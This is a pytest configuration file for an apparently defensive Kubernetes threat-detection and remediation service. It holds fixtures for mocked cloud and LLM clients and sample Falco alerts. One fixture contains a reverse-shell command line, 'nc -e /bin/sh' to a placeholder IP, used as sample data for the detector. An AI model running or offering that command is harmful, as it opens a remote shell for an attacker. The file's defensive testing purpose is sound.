"""
Pytest configuration and fixtures
"""
import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, MagicMock
from typing import Generator, AsyncGenerator
from fastapi.testclient import TestClient
from httpx import AsyncClient

# Import app after setting up test environment
import sys
from pathlib import Path

# Add backend to path
backend_path = Path(__file__).parent.parent / "backend"
sys.path.insert(0, str(backend_path))

from app.main import app
from app.storage import threats_db, actions_db
from app.models.threat_event import ThreatEvent, ThreatSeverity, ThreatType
from app.models.remediation_action import RemediationAction, ActionType, RiskLevel


@pytest.fixture(scope="function")
def reset_storage():
    """Reset in-memory storage before each test"""
    threats_db.clear()
    actions_db.clear()
    yield
    threats_db.clear()
    actions_db.clear()


@pytest.fixture
def mock_k8s_client():
    """Mock Kubernetes client"""
    mock_client = Mock()
    mock_core_v1 = Mock()
    mock_networking_v1 = Mock()
    
    # Mock pod deletion
    mock_core_v1.delete_namespaced_pod = Mock(return_value=None)
    
    # Mock network policy creation
    mock_networking_v1.create_namespaced_network_policy = Mock(return_value=None)
    
    mock_client.CoreV1Api = Mock(return_value=mock_core_v1)
    mock_client.NetworkingV1Api = Mock(return_value=mock_networking_v1)
    
    return {
        'core_v1': mock_core_v1,
        'networking_v1': mock_networking_v1,
        'client': mock_client
    }


@pytest.fixture
def mock_openai_client():
    """Mock OpenAI client"""
    mock_client = AsyncMock()
    mock_response = Mock()
    mock_response.choices = [Mock()]
    mock_response.choices[0].message = Mock()
    mock_response.choices[0].message.content = "Sir, this is a test explanation."
    mock_client.chat.completions.create = AsyncMock(return_value=mock_response)
    return mock_client


@pytest.fixture
def mock_anthropic_client():
    """Mock Anthropic client"""
    mock_client = AsyncMock()
    mock_response = Mock()
    mock_response.content = [Mock()]
    mock_response.content[0].text = "Sir, this is a test explanation."
    mock_client.messages.create = AsyncMock(return_value=mock_response)
    return mock_client


@pytest.fixture
def mock_ollama_response():
    """Mock Ollama HTTP response"""
    return {
        "response": "Sir, this is a test explanation."
    }


@pytest.fixture
def sample_falco_event():
    """Sample Falco event for testing"""
    return {
        "output": "17:20:42.123456789: Warning Terminal shell in container",
        "priority": "Warning",
        "rule": "Terminal shell in container",
        "time": "2024-01-01T17:20:42.123456789Z",
        "output_fields": {
            "k8s.pod.name": "test-pod",
            "k8s.ns.name": "default",
            "container.name": "test-container",
            "user.name": "root"
        }
    }


@pytest.fixture
def sample_reverse_shell_event():
    """Sample reverse shell Falco event"""
    return {
        "output": "17:20:42.123456789: Critical Reverse shell detected",
        "priority": "Critical",
        "rule": "Reverse shell detected",
        "time": "2024-01-01T17:20:42.123456789Z",
        "output_fields": {
            "k8s.pod.name": "evil-pod",
            "k8s.ns.name": "default",
            "container.name": "hacker",
            "proc.cmdline": "nc -e /bin/sh 1.2.3.4 4444"
        }
    }


@pytest.fixture
def sample_threat_event(reset_storage):
    """Create a sample threat event"""
    threat = ThreatEvent(
        severity=ThreatSeverity.HIGH,
        threat_type=ThreatType.REVERSE_SHELL,
        source_pod="test-pod",
        source_namespace="default",
        source_container="test-container",
        description="Test threat description",
        falco_output="Test output",
        falco_rule="Test rule",
        falco_priority="Warning",
        confidence=0.8
    )
    threats_db.append(threat)
    return threat


@pytest.fixture
def test_client():
    """FastAPI test client"""
    return TestClient(app)


@pytest.fixture
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Async HTTP client for testing"""
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()
